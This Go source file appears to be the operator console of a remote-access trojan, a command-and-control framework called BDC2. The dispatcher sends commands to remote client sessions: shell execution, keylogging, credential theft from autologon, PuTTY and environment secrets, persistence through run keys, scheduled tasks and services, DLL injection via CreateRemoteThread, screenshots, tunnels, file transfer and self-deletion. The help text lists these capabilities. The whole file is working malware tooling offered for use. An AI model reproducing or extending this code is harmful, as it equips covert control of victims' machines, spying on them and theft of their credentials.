// Package ops implements the operator command set shared by the TUI and the
// no-TTY line mode. It only uses the frozen BDC2 v1 operator RPCs exposed by
// internal/client.
package ops

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"

	"backd/c2/mvp/tui/internal/client"
)

// Emitter receives user-visible events. Implementations may be the tview UI or
// the plain line-mode REPL.
type Emitter interface {
	Printf(format string, a ...any)
	Status(text string)
	Progress(done, total int64, label string)
	Clear()
	Confirm(title, prompt string) bool
	SetSessions([]client.Session, map[string]any)
	Tunnel(client.Notice)
}

// Dispatcher executes one operator command at a time.
type Dispatcher struct {
	C    *client.Client
	E    Emitter
	Home string // base directory for downloads (default "downloads")

	ActionLog string

	mu     sync.Mutex
	busy   bool
	cancel context.CancelFunc
	forced uint64

	selected func() uint64
}

// New returns a dispatcher using the UI-selected session.
func New(c *client.Client, e Emitter, home string, selected func() uint64) *Dispatcher {
	if home == "" {
		home = "downloads"
	}
	return &Dispatcher{C: c, E: e, Home: home, selected: selected}
}

// SetSession pins the session used by subsequent commands ("use <id>"); 0
// restores "whatever row is selected".
func (d *Dispatcher) SetSession(id uint64) { d.mu.Lock(); d.forced = id; d.mu.Unlock() }

// Session returns the effective session id.
func (d *Dispatcher) Session() uint64 {
	d.mu.Lock()
	f := d.forced
	d.mu.Unlock()
	if f != 0 {
		return f
	}
	if d.selected != nil {
		return d.selected()
	}
	return 0
}

// Busy reports whether a command is executing.
func (d *Dispatcher) Busy() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.busy
}

// Cancel cancels the running command and therefore drops the channel if it is
// waiting on a reply.
func (d *Dispatcher) Cancel() {
	d.mu.Lock()
	cancel := d.cancel
	d.mu.Unlock()
	if cancel != nil {
		cancel()
	}
}

// Danger reports whether a command needs an explicit confirmation. The set is
// exactly the destructive one required by the operator spec.
func Danger(cmd string) bool {
	switch cmd {
	case "selfdestruct", "kill", "persist_disable", "cleanup":
		return true
	}
	return false
}

// Exec runs one command line synchronously. The caller normally spawns a
// goroutine so the UI stays responsive.
func (d *Dispatcher) Exec(parent context.Context, line string) error {
	line = strings.TrimSpace(line)
	if line == "" {
		return nil
	}
	d.mu.Lock()
	if d.busy {
		d.mu.Unlock()
		return errors.New("busy: another operation is still running (Esc cancels)")
	}
	ctx, cancel := context.WithCancel(parent)
	d.busy = true
	d.cancel = cancel
	d.mu.Unlock()
	defer func() {
		cancel()
		d.mu.Lock()
		d.busy = false
		d.cancel = nil
		d.mu.Unlock()
	}()

	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	rest := strings.TrimSpace(line[len(fields[0]):])
	d.action(line)
	err := d.execute(ctx, cmd, fields, rest)
	if err != nil {
		d.E.Printf("ERR %v", err)
		d.E.Status("error: " + err.Error())
	}
	return err
}

func (d *Dispatcher) action(line string) {
	if strings.TrimSpace(d.ActionLog) == "" {
		return
	}
	rec := map[string]any{
		"ts":      time.Now().UTC().Format(time.RFC3339),
		"session": d.Session(),
		"command": line,
	}
	b, _ := json.Marshal(rec)
	f, err := os.OpenFile(d.ActionLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.Write(append(b, '\n'))
}

func (d *Dispatcher) execute(ctx context.Context, cmd string, fields []string, rest string) error {
	switch cmd {
	case "help", "?":
		d.E.Printf("%s", HelpText)
		return nil
	case "clear", "cls":
		d.E.Clear()
		return nil
	case "list", "sessions":
		return d.refresh(ctx)
	case "stats":
		sessions, stats, err := d.C.List(ctx)
		if err != nil {
			return err
		}
		d.E.SetSessions(sessions, stats)
		b, _ := json.MarshalIndent(stats, "", "  ")
		d.E.Printf("SESSIONS %d\nSTATS %s", len(sessions), string(b))
		return nil
	case "use":
		if len(fields) < 2 {
			return errors.New("usage: use <session-id> (0 = follow table selection)")
		}
		id, err := strconv.ParseUint(fields[1], 10, 64)
		if err != nil {
			return fmt.Errorf("bad session id: %w", err)
		}
		d.SetSession(id)
		d.E.Status(fmt.Sprintf("session pinned to %d", id))
		return nil
	case "reload":
		p := ""
		if len(fields) > 1 {
			p = fields[1]
		}
		sessions, stats, err := d.C.Reload(ctx, p)
		d.E.SetSessions(sessions, stats)
		if err != nil {
			return err
		}
		b, _ := json.Marshal(stats)
		d.E.Printf("reload ok: sessions=%d stats=%s", len(sessions), string(b))
		return nil
	case "reconnect":
		d.E.Status("reconnecting...")
		d.C.Close()
		return d.C.Connect(ctx)
	case "audit":
		if len(fields) < 3 || strings.ToLower(fields[1]) != "verify" {
			return errors.New("usage: audit verify <audit.jsonl>")
		}
		n, broken, err := client.AuditVerify(fields[2])
		if err != nil {
			d.E.Printf("AUDIT FAIL verified=%d broken_line=%d err=%v", n, broken, err)
			return err
		}
		d.E.Printf("AUDIT OK verified=%d", n)
		return nil
	case "shell", "sysinfo", "ps", "env", "ls", "cat", "screenshot", "creds",
		"persist_status", "keylog_start", "keylog_stop", "keylog_dump",
		"tunnel_open", "tunnel_send", "tunnel_recv", "tunnel_close", "inject":
		return d.taskCommand(ctx, cmd, fields, rest)
	case "persist":
		m := "runkey,startup"
		if rest != "" {
			m = rest
		}
		return d.runTask(ctx, "persist_install", m)
	case "persist_disable":
		m := "runkey,startup,schtask,service"
		if rest != "" {
			m = rest
		}
		return d.runTask(ctx, "persist_disable", m)
	case "cleanup":
		if rest == "" {
			return errors.New("usage: cleanup <path[;path]>")
		}
		return d.runTask(ctx, "cleanup", rest)
	case "selfdestruct":
		return d.runTask(ctx, "selfdestruct", "")
	case "kill":
		sid := d.Session()
		if sid == 0 {
			return errors.New("no session selected")
		}
		// kill is in Danger(); the direct RPC path must confirm too, otherwise
		// the confirmation requirement only applies to task-based actions.
		if !d.E.Confirm("Confirm kill", dangerPrompt("kill", "")) {
			d.E.Printf("cancelled kill")
			d.E.Status("cancelled")
			return nil
		}
		if err := d.C.Kill(ctx, strconv.FormatUint(sid, 10)); err != nil {
			return err
		}
		d.E.Printf("session %d dropped", sid)
		return nil
	case "upload", "put":
		return d.upload(ctx, fields)
	case "download", "get":
		return d.download(ctx, fields)
	case "tunnel":
		return d.tunnelCommand(ctx, fields)
	default:
		return fmt.Errorf("unknown command %q (F1 / help)", cmd)
	}
}

func (d *Dispatcher) taskCommand(ctx context.Context, cmd string, fields []string, rest string) error {
	switch cmd {
	case "shell":
		if rest == "" {
			return errors.New("usage: shell <command>")
		}
		return d.runTask(ctx, "shell", rest)
	case "ls", "cat":
		if rest == "" {
			return fmt.Errorf("usage: %s <path>", cmd)
		}
		return d.runTask(ctx, cmd, rest)
	case "tunnel_open", "tunnel_close":
		if len(fields) < 2 {
			return fmt.Errorf("usage: %s <session> <host:port|id>", cmd)
		}
		return d.runTask(ctx, cmd, rest)
	case "tunnel_send":
		if len(fields) < 3 {
			return errors.New("usage: tunnel_send <id> <data>")
		}
		return d.runTask(ctx, cmd, strings.TrimSpace(rest))
	case "tunnel_recv":
		if len(fields) < 2 {
			return errors.New("usage: tunnel_recv <id> [max]")
		}
		return d.runTask(ctx, cmd, rest)
	case "inject":
		if len(fields) < 3 {
			return errors.New("usage: inject <pid> <dll-path>")
		}
		return d.runTask(ctx, cmd, rest)
	default:
		return d.runTask(ctx, cmd, rest)
	}
}

func (d *Dispatcher) tunnelCommand(ctx context.Context, fields []string) error {
	if len(fields) < 2 {
		return errors.New("usage: tunnel open <host:port> | send <id> <data> | recv <id> [max] | close <id>")
	}
	sub := strings.ToLower(fields[1])
	switch sub {
	case "open":
		if len(fields) < 3 {
			return errors.New("usage: tunnel open <host:port>")
		}
		return d.runTask(ctx, "tunnel_open", fields[2])
	case "send":
		if len(fields) < 5 {
			return errors.New("usage: tunnel send <id> <data>")
		}
		return d.runTask(ctx, "tunnel_send", fields[2]+" "+strings.Join(fields[3:], " "))
	case "recv":
		if len(fields) < 3 {
			return errors.New("usage: tunnel recv <id> [max]")
		}
		return d.runTask(ctx, "tunnel_recv", strings.Join(fields[2:], " "))
	case "close":
		if len(fields) < 3 {
			return errors.New("usage: tunnel close <id>")
		}
		return d.runTask(ctx, "tunnel_close", fields[2])
	default:
		return fmt.Errorf("unknown tunnel subcommand %q", sub)
	}
}

func (d *Dispatcher) sessionString() (string, error) {
	sid := d.Session()
	if sid == 0 {
		return "", errors.New("no session selected (pick a row or 'use <id>')")
	}
	return strconv.FormatUint(sid, 10), nil
}

func taskTimeout(kind string) int {
	switch kind {
	case "shell":
		return 120
	case "selfdestruct", "tunnel_recv", "sleep":
		return 30
	default:
		return 60
	}
}

func (d *Dispatcher) runTask(ctx context.Context, kind, args string, extra ...string) error {
	sid, err := d.sessionString()
	if err != nil {
		return err
	}
	if Danger(kind) {
		if msg := dangerPrompt(kind, args); msg != "" {
			if !d.E.Confirm("Confirm "+kind, msg) {
				d.E.Printf("cancelled %s", kind)
				d.E.Status("cancelled")
				return nil
			}
		}
	}
	d.E.Status(fmt.Sprintf("%s on session %s ...", kind, sid))
	out, err := d.C.Task(ctx, sid, kind, args, taskTimeout(kind))
	if err != nil {
		return err
	}
	d.updateFromResult(kind, out)
	return nil
}

func (d *Dispatcher) updateFromResult(kind string, r client.TaskResult) {
	ts := time.Now().Format("15:04:05")
	d.E.Printf("%s %s session=%s status=%s", ts, kind, r.Session, r.Status)
	if r.Err != "" {
		d.E.Printf("ERR %s", r.Err)
	}
	if len(r.Out) > 0 {
		d.E.Printf("%s", printable(r.Out))
	}
	if r.Status != "" && r.Status != "ok" {
		d.E.Status(kind + ": " + r.Status)
	} else {
		d.E.Status(kind + ": ok")
	}
}

func (d *Dispatcher) refresh(ctx context.Context) error {
	sessions, stats, err := d.C.List(ctx)
	if err != nil {
		return err
	}
	d.E.SetSessions(sessions, stats)
	if d.Session() == 0 && len(sessions) > 0 {
		d.SetSession(sessions[0].ID)
	}
	d.E.Printf("sessions=%d", len(sessions))
	d.E.Status(fmt.Sprintf("%d session(s)", len(sessions)))
	return nil
}

func dangerPrompt(kind, args string) string {
	switch kind {
	case "selfdestruct":
		return "This removes persistence and schedules the client for self-deletion. It cannot be undone."
	case "kill":
		return "The session will be dropped immediately."
	case "persist_disable":
		return "Persistence entries will be removed from the client: " + args
	case "cleanup":
		return "These paths will be deleted on the client: " + args
	}
	return ""
}

func (d *Dispatcher) upload(ctx context.Context, fields []string) error {
	if len(fields) < 3 {
		return errors.New("usage: upload <local> <remote> [offset]")
	}
	sid, err := d.sessionString()
	if err != nil {
		return err
	}
	local, remote := fields[1], fields[2]
	var off int64
	if len(fields) > 3 {
		if off, err = strconv.ParseInt(fields[3], 10, 64); err != nil {
			return fmt.Errorf("bad offset: %w", err)
		}
	}
	all, err := os.ReadFile(local)
	if err != nil {
		return err
	}
	if off < 0 || off > int64(len(all)) {
		return fmt.Errorf("offset %d outside file (%d bytes)", off, len(all))
	}
	tail := all[off:]
	if len(tail) > client.MaxPushPayload {
		return fmt.Errorf("tail is %d bytes; the single-frame limit is %d — split the file and resume with an offset",
			len(tail), client.MaxPushPayload)
	}
	d.E.Status(fmt.Sprintf("uploading %s -> %s (%d bytes, offset %d)...", local, remote, len(tail), off))
	if off > 0 {
		d.E.Printf("resume: sending bytes [%d,%d) of %s", off, len(all), local)
	}
	res, err := d.C.Push(ctx, sid, remote, tail, off)
	if err != nil {
		return err
	}
	d.E.Progress(int64(len(tail)), int64(len(tail)), "upload")
	if res.Status != "ok" {
		return &client.RemoteError{Msg: res.Err}
	}
	d.E.Printf("upload ok: %s sha=%s", remote, res.SHA)
	d.E.Status("upload ok")
	return nil
}

func (d *Dispatcher) download(ctx context.Context, fields []string) error {
	if len(fields) < 2 {
		return errors.New("usage: download <remote> [local]")
	}
	sid, err := d.sessionString()
	if err != nil {
		return err
	}
	remote := fields[1]
	local := ""
	if len(fields) > 2 {
		local = fields[2]
	}
	if local == "" {
		name := path.Base(strings.ReplaceAll(remote, "\\", "/"))
		if name == "." || name == "/" || name == "" {
			name = "download.bin"
		}
		local = filepath.Join(d.Home, name)
	}
	d.E.Status("staging remote file...")
	pull, err := d.C.Pull(ctx, sid, remote)
	if err != nil {
		return err
	}
	d.E.Printf("staged %s: xfer=%s size=%d sha=%s", remote, pull.Xfer, pull.Size, pull.SHA)
	if err := os.MkdirAll(filepath.Dir(local), 0o755); err != nil {
		return err
	}
	part := local + ".part"
	f, err := os.Create(part)
	if err != nil {
		return err
	}
	d.E.Progress(0, pull.Size, "download")
	n, sha, err := d.C.Fetch(ctx, pull.Xfer, f, pull.Size, func(done, total int64) {
		d.E.Progress(done, total, "download")
	})
	closeErr := f.Close()
	if err != nil {
		_ = os.Remove(part)
		return err
	}
	if closeErr != nil {
		_ = os.Remove(part)
		return closeErr
	}
	if err := os.Rename(part, local); err != nil {
		return err
	}
	d.E.Progress(n, pull.Size, "download")
	if pull.SHA != "" && sha != "" && !strings.EqualFold(pull.SHA, sha) {
		d.E.Printf("warning: sha mismatch server=%s stream=%s", pull.SHA, sha)
	}
	d.E.Printf("download ok: %s (%d bytes) sha=%s", local, n, sha)
	d.E.Status("download ok")
	return nil
}

// printable renders task output; binary blobs are summarised as hex. Windows
// Server 2008/cmd.exe returns Chinese in the OEM code page (CP936/GBK), so a
// valid UTF-8 check alone would wrongly classify normal text as binary.
func printable(b []byte) string {
	if s, ok := decodeConsole(b); ok {
		if len(s) > 256*1024 {
			return s[:256*1024] + "\n… (truncated)"
		}
		return s
	}
	n := len(b)
	if n > 4096 {
		n = 4096
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("(binary %d bytes, first %d shown as hex)\n", len(b), n))
	for i := 0; i < n; i += 16 {
		end := i + 16
		if end > n {
			end = n
		}
		sb.WriteString(fmt.Sprintf("%08x  ", i))
		for j := i; j < end; j++ {
			sb.WriteString(fmt.Sprintf("%02x ", b[j]))
		}
		sb.WriteString("\n")
	}
	return sb.String()
}

func decodeConsole(b []byte) (string, bool) {
	if len(b) == 0 {
		return "", true
	}
	if bytes.HasPrefix(b, []byte{0xEF, 0xBB, 0xBF}) {
		b = b[3:]
	}
	if len(b) >= 2 && b[0] == 0xFF && b[1] == 0xFE {
		u := make([]uint16, 0, (len(b)-2)/2)
		for i := 2; i+1 < len(b); i += 2 {
			u = append(u, binary.LittleEndian.Uint16(b[i:i+2]))
		}
		return string(utf16.Decode(u)), true
	}
	if len(b) >= 2 && b[0] == 0xFE && b[1] == 0xFF {
		u := make([]uint16, 0, (len(b)-2)/2)
		for i := 2; i+1 < len(b); i += 2 {
			u = append(u, binary.BigEndian.Uint16(b[i:i+2]))
		}
		return string(utf16.Decode(u)), true
	}
	if utf8.Valid(b) && !bytes.ContainsRune(b, '\x00') {
		return string(b), true
	}
	if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(b); err == nil && utf8.Valid(dec) && !bytes.ContainsRune(dec, '\x00') {
		return string(dec), true
	}
	return "", false
}

// HelpText is shared by the TUI help page and the REPL.
const HelpText = `BDC2 v1 operator TUI — commands (prefix a row or use <id>)
  list | stats                    refresh sessions / show server stats
  use <id>                        pin commands to a session (0 = follow selection)
  reload [config]                 hot-reload server config (limits, flags, PSKs)
  reconnect                       drop and re-open the operator channel
  shell <command>                 run a shell command on the client
  sysinfo | ps | env              host information / process list / environment
  ls <path> | cat <path>          list a directory / read a text file
  upload <local> <remote> [off]   push a file (off = resume tail offset)
  download <remote> [local]       stage + download with a progress bar
  persist [methods]               install persistence (runkey,startup,schtask,service)
  persist_status                  report persistence state
  persist_disable [methods]       remove persistence            (confirmation)
  keylog_start|keylog_stop|keylog_dump
  tunnel open <host:port>         open a client-side TCP tunnel
  tunnel send <id> <data> | tunnel recv <id> [max] | tunnel close <id>
  inject <pid> <dll-path>         CreateRemoteThread(LoadLibrary)
  creds                           autologon / PuTTY / environment secrets
  screenshot                      capture the client desktop (BMP path reported)
  cleanup <path[;path]>           delete files/directories        (confirmation)
  selfdestruct                    remove persistence + self-delete (confirmation)
  kill                            drop the selected session       (confirmation)
  audit verify <audit.jsonl>      verify the server audit hash chain
  clear                           clear the output pane

Keys: F1/? help · Tab next panel · / search · Enter run · Esc cancel/close ·
      q quit (not while typing)

The protocol is frozen BDC2 v1: this tool only configures the endpoint,
credentials and TLS; no frame type, field or address is added.`
